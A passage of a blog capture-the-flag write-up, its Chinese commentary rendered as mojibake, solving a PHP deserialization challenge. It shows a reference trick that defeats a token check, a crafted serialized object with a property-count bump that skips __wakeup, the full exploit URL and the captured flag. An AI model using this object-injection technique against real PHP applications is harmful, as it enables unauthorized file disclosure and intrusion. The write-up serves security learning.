<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = &amp;<span class="keyword">$this</span>-&gt;token;   <span class="comment">//ç›´æ¥å°†token_flagçš„å€¼æ”¹ä¸ºtokençš„å¼•ç”¨,è¿™æ ·åœ¨éšæœºmd5ä¹‹åå†åˆ¤æ–­ä¾ç„¶ç›¸ç­‰</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// echo 'exec getFlag()';</span></span><br><span class="line">        <span class="comment">// $this-&gt;token_flag = md5(rand(1,10000));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>hint.php</code>çš„ä»£ç æœ€åæ·»åŠ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$f=<span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line">$h=<span class="keyword">new</span> Handle($f);</span><br><span class="line">$s=serialize($h).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°æ„é€ payload</p>
<p><code>O:6:&quot;Handle&quot;:1:{s:14:&quot;Handlehandle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
<p>æ ¼å¼åŒ– â€œ æ›¿æ¢æˆ  %22  ,  ç±»åé™„è¿‘æ·»åŠ %00</p>
<p><code>O:6:%22Handle%22:1:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;N;s:10:%22token_flag%22;R:4;}}</code></p>
<p>ä½†åœ¨<code>Handle</code>çš„<code>__wakeup</code>ä¸­æ‰€æœ‰å˜é‡è¢«é‡ç½®äº†,ä½†åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²é•¿åº¦å¤§äºå®é™…é•¿åº¦çš„æ—¶å€™ä¼šè·³è¿‡<code>weakup</code>,æ‰€ä»¥æˆ‘ä»¬å°†<code>Handle</code>çš„å€¼åŠ ä¸€</p>
<p><code>O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;N;s:10:%22token_flag%22;R:4;}}</code></p>
<p>å®Œæ•´payload</p>
<p><code>ichunqiu.com///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">'flag&#123;44623d5b-79ab-479a-bfdf-285856871e4e&#125;'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/background.png)"><div class="layout" id="footer"><div class="copyright">&copy;2019 By Arnoux</div><div class="framework-info"><span>é©±åŠ¨ - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>